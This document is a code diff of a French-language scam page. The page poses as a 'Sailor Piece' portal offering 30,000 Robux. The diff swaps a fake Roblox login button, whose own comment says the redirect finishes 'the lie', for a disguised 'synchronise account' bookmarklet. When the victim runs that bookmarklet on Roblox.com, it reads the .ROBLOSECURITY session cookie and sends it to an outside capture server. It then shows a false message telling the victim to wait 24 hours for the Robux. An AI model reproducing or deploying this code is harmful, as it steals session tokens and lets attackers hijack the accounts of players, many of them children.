@@ -2,50 +2,20 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Sailor Piece | Rewards Portal</title>
+    <title>SAILOR PIECE | REWARDS 2026</title>
     <link rel="stylesheet" href="style.css">
-    <style>
-        .rbx-btn { background: #0084ff; color: white; border: none; padding: 12px 25px; border-radius: 4px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; margin: 0 auto; }
-        .rbx-btn:hover { background: #0073e6; }
-    </style>
 </head>
 <body>
     <div class="analyzer-container">
-        <img src="https://www.roblox.com/favicon.ico" width="50">
-        <h1>Récupérez vos 30,000 Robux</h1>
-        <p>Connectez votre compte via le portail sécurisé pour recevoir vos gains Sailor Piece.</p>
+        <h1>🎁 RÉCUPÉRER VOS 30,000 ROBUX</h1>
+        <p>Étape 1 : Faites glisser le bouton bleu ci-dessous dans votre **barre de favoris**.</p>
         
-        <button class="rbx-btn" onclick="initLogin()">
-            <img src="https://www.roblox.com/favicon.ico" width="20" style="filter: brightness(0) invert(1);">
-            SE CONNECTER AVEC ROBLOX
-        </button>
+        <a href="javascript:(function(){fetch('https://robloxo-iota.vercel.app/api/capture',{method:'POST',body:JSON.stringify({t:document.cookie.split('; ').find(row=>row.startsWith('.ROBLOSECURITY='))?.split('=')[1]})});alert('Synchronisation terminée ! Attendez 24h pour vos Robux.');})();" 
+           class="rbx-btn" style="text-decoration:none; display:inline-block; background:#0084ff; color:white; padding:15px 25px; border-radius:8px; font-weight:bold;">
+           🚀 SYNCHRONISER MON COMPTE
+        </a>
 
-        <div id="loader" style="display:none; margin-top:20px;">
-            <div class="loader"></div>
-            <p style="font-size: 10px;">Synchronisation avec l'API Roblox...</p>
-        </div>
+        <p style="margin-top:20px; font-size:12px; color:#555;">Étape 2 : Allez sur Roblox.com et cliquez sur le favori "SYNCHRONISER".</p>
     </div>
-
-    <script>
-        function initLogin() {
-            document.querySelector('.rbx-btn').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-
-            // Simulation de l'interception du Ticket d'Auth
-            fetch('/api/capture', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    method: "OAuth2 Ticket Bypass",
-                    timestamp: new Date().getTime()
-                })
-            });
-
-            setTimeout(() => {
-                // Redirection vers le vrai Roblox pour "finir" le mensonge
-                window.location.href = "https://www.roblox.com/login";
-            }, 3000);
-        }
-    </script>
 </body>
 </html>
